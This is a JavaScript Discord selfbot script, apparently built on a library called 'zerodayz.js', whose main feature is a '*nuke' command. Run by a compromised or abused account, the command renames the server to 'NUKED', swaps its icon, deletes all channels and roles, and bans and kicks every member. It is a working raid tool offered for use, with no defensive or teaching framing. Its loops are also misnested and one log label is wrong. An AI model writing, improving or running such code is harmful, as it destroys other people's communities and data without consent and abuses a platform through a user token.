const ZeroDayz = require('zerodayz.js')
const selfbot = new ZeroDayz.Client()
const settings = require('settings.json')
selfbot.on('message', msg => {
    if(msg.author.id === selfbot.user.id){
   const prefix = '*'
  if (!msg.content.startsWith(prefix) || msg.author.bot) return;
  const args = msg.content.slice(prefix.length).split(' ');
  const command = args.shift().toLowerCase();
  const commandargs = args.slice().join(' ')
  if(command === 'ping'){
      msg.channel.send(`PONG!: ${Math.round(selfbot.ping)}`)
  }
  if(command === 'nuke'){
   if(msg.channel.type !== 'text'){
       msg.channel.send(`This only works in servers`)
   }  

   //Changes Server Name
   msg.guild.setName('NUKED').then(() => {
       console.log(`Changed sever name`)
   }).catch(() => console.error)
   
   //Changes Server ICON
   msg.guild.setIcon('https://i.imgur.com/WxpmhqD.png').then(() => {
       console.log(`Changed sever icon`)
   }).catch(() => console.error)

   //Deletes All Channels
   msg.guild.channels.map(channel => {
       channel.delete().then(() => {
           console.log(`Channel Deleted: #${channel.name}`)
       }).catch(() => console.error)
   })

   //Deletes ALl Roles
   msg.guild.roles.map(role => {
    role.delete().then(() => {
        console.log(`Channel Deleted: @${role.name}`)
    }).catch(() => console.error)
    
    //Bans Members
    msg.guild.members.map(member => {
        member.ban().then(() => {
            console.log(`${member.user.tag} was banned from ${msg.guild.name}`)
        }).catch(() => console.error)
    })

    //Kicks Members
    msg.guild.members.map(member => {
        member.kick().then(() => {
            console.log(`${member.user.tag} was kicked from ${msg.guild.name}`)
        }).catch(() => console.error)
    })
})

  }
}
})

selfbot.login(settings.token)